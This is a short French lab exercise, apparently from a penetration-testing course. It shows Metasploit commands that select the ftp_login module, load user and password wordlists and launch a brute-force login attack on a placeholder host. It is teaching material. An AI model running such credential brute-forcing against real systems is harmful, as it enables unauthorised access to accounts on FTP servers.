# Exercice 2

- Effectuez une recherche pour trouver un exploit de brute-force sur des logins FTP
```bash
search ftp_brute
use auxiliary/scanner/ftp/ftp_login
```
- Mettez 2 fichiers en place dans votre "home directory" (users.txt et passwords.txt)

- Renseignez les paramètres corrects pour le module – sachant qu'un utilisateur peut avoir un compte sans mot de passe
```bash
set USER_FILE /home/kali/users.txt
set PASS_FILE /home/kali/passwords.txt
```
- Lancez l’attaque sur la machine X.X.X.X
```bash
set RHOSTS X.X.X.X
run
```
- Observez le résultat